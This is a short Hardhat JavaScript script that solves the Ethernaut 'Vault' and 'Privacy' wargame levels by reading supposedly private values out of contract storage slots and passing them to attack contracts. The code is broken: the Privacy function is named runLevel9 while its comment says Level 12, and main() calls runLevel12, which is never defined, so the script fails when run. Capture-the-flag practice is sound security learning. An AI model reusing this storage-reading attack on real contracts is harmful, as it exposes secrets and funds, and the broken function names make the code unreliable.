const hre = require("hardhat");
const { deployContract } = require("./helpers");

// Ethernaut Level 8 - Vault
async function runLevel8() {
  const vaultFactory = await deployContract("VaultFactory");
  const vaultAttack = await deployContract("VaultAttack", [vaultFactory.address]);
  const vaultAddress = await vaultAttack.vaultAddress();

  const passwordStorageLocation = 1;
  const password = await hre.ethers.provider.getStorageAt(vaultAddress, passwordStorageLocation);
  const res = await vaultAttack.attack(password);
  console.log(`Unlock successful: ${res}`);
}

// Ethernaut Level 12 - Privacy
async function runLevel9() {
  const privacyFactory = await deployContract("PrivacyFactory");
  const privacyAttack = await deployContract("PrivacyAttack", [privacyFactory.address]);
  const privacyAddress = await privacyAttack.privacyAddress();
  // bytes32 array occupies slot 3 to 5
  const dataSlot = 5;
  const key = await hre.ethers.provider.getStorageAt(privacyAddress, dataSlot);
  const res = await privacyAttack.attack(key);
  console.log(`Unlock successful: ${res}`);
}

async function main() {
  // runLevel8();
  runLevel12();
  // runLevel18();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
